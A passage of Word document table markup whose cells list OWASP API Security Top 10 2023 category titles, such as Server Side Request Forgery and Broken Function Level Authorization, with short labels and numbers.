              <w:t>199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API3:2023 – Broken Object Property Level Authorization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API4:2023 – Unrestricted Resource Consumption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AdminAccess</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>API5:2023 – Broken Function Level Authorization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BusinessFlows</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>API6:2023 – Unrestricted Access to Sensitive Business Flows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API7:2023 – Server Side Request Forgery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Misconfiguration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API9:2023 – Improper Inventory Management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UnsafeConsumption</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>API10:2023 – Unsafe Consumption of APIs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>1498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